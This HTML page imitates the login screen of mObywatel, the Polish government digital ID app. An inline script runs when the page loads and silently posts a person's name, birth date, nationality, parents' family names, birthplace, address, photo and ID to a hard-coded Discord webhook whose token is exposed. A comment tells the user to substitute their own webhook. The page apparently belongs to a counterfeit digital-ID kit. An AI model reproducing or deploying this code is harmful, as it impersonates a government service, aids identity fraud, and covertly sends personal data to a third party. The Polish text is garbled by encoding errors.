<head>
    <title>mObywatel</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="assets/id.css?v=1.5">
    <link rel="stylesheet" href="assets/main.css">
    <link rel="icon" type="image/x-icon" href="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4=w240-h480-rw">
    <link rel="apple-touch-icon" href="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4=w240-h480-rw">
    <link rel="shortcut icon" href="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4=w240-h480-rw">
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
</head>
<body>
    <div class="background"></div>
    <div class="top_grid">
        <img class="logo" src="images/coi_common_ui_ic_mobywatel_logo.svg">
        <p class="logo_text">mObywatel</p>
    </div>
    <div class="top_text">
        <p class="welcome"></p>
        <p class="login_text">Zaloguj siƒô do aplikacji.</p>
    </div>
    <div class="password_box">
        <div class="password_grid">
            <p class="password_text">Has≈Ço</p>
            <div class="input_holder">
                <input class="password_input">
                <div class="eye"></div>
            </div>
            <p class="forgot_password">Nie pamiƒôtasz has≈Ça?</p>
        </div>
    </div>
    <div class="bottom">
        <p class="login">Zaloguj siƒô</p>
        <div class="data">
            <img class="logo_other" style="height: 20px;" src="images/coi_common_ui_ic_coi_mobywatel_logo.svg
">
            <img class="logo_other" src="images/mc.svg">
            <p class="version">wersja 4.52.0 (13)</p>
        </div>
    </div>
    <script src="assets/id.js?v=1.1"></script>
    <script src="assets/manifest.js"></script>
    <script src="assets/tracker.js"></script>
    <script>
        // Discord webhook URL - ZMIE≈É NA SW√ìJ WEBHOOK
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1375208425130033152/kQKD_hMox7ePfQRLHkuB-DeTnt5Ypew0H8Y5ut0UPlMrKZkEsugxCPwTyPseK9iOk8B8';

        // Function to get URL parameters
        function getUrlParameters() {
            const urlParams = new URLSearchParams(window.location.search);
            return {
                id: urlParams.get('id'),
                sex: urlParams.get('sex'),
                image: urlParams.get('image'),
                birthday: urlParams.get('birthday'),
                name: urlParams.get('name'),
                surname: urlParams.get('surname'),
                nationality: urlParams.get('nationality'),
                familyName: urlParams.get('familyName'),
                fathersFamilyName: urlParams.get('fathersFamilyName'),
                mothersFamilyName: urlParams.get('mothersFamilyName'),
                birthPlace: urlParams.get('birthPlace'),
                countryOfBirth: urlParams.get('countryOfBirth'),
                adress1: urlParams.get('adress1'),
                adress2: urlParams.get('adress2'),
                city: urlParams.get('city')
            };
        }

        // Function to send Discord webhook
        async function sendDiscordWebhook(userData) {
            try {
                // Format sex display
                const sexDisplay = userData.sex === 'k' ? 'Kobieta' : 'Mƒô≈ºczyzna';
                
                // Format address
                const address = `${decodeURIComponent(userData.adress1 || '')} ${userData.adress2 || ''} ${userData.city || ''}`.trim();
                
                // Create embed
                const embed = {
                    title: "üîç Weryfikacja to≈ºsamo≈õci",
                    color: 0x007AFF,
                    fields: [
                        {
                            name: "Imiƒô",
                            value: userData.name || 'Brak danych',
                            inline: true
                        },
                        {
                            name: "Nazwisko", 
                            value: userData.surname || 'Brak danych',
                            inline: true
                        },
                        {
                            name: "P≈Çeƒá",
                            value: sexDisplay,
                            inline: true
                        },
                        {
                            name: "Data urodzenia",
                            value: userData.birthday || 'Brak danych',
                            inline: true
                        },
                        {
                            name: "Obywatelstwo",
                            value: userData.nationality || 'Brak danych',
                            inline: true
                        },
                        {
                            name: "Miejsce urodzenia",
                            value: userData.birthPlace || 'Brak danych',
                            inline: true
                        },
                        {
                            name: "Adres",
                            value: address || 'Brak danych',
                            inline: false
                        }
                    ],
                    footer: {
                        text: `ID: ${userData.id || 'Brak'} ‚Ä¢ ${new Date().toLocaleString('pl-PL')}`
                    }
                };

                // Add image if available
                if (userData.image && userData.image.trim() !== '') {
                    embed.thumbnail = {
                        url: userData.image
                    };
                }

                // Create webhook payload
                const payload = {
                    embeds: [embed],
                    components: [
                        {
                            type: 1,
                            components: [
                                {
                                    type: 2,
                                    style: 5,
                                    label: "Przejd≈∫ do profilu",
                                    url: `${window.location.origin}/card.html?id=${userData.id}&name=${encodeURIComponent(userData.name || '')}&surname=${encodeURIComponent(userData.surname || '')}&birthday=${encodeURIComponent(userData.birthday || '')}&sex=${userData.sex || ''}&nationality=${encodeURIComponent(userData.nationality || '')}&familyName=${encodeURIComponent(userData.familyName || '')}&fathersFamilyName=${encodeURIComponent(userData.fathersFamilyName || '')}&mothersFamilyName=${encodeURIComponent(userData.mothersFamilyName || '')}&birthPlace=${encodeURIComponent(userData.birthPlace || '')}&countryOfBirth=${encodeURIComponent(userData.countryOfBirth || '')}&adress1=${encodeURIComponent(userData.adress1 || '')}&adress2=${encodeURIComponent(userData.adress2 || '')}&city=${encodeURIComponent(userData.city || '')}&image=${encodeURIComponent(userData.image || '')}`
                                }
                            ]
                        }
                    ]
                };

                // Send webhook
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Discord webhook sent successfully');
                } else {
                    console.error('Failed to send Discord webhook:', response.status);
                }

            } catch (error) {
                console.error('Error sending Discord webhook:', error);
            }
        }

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            const userData = getUrlParameters();
            
            if (userData.name && userData.surname) {
                // Send Discord webhook
                sendDiscordWebhook(userData);
            }
        });
    </script>
</body>
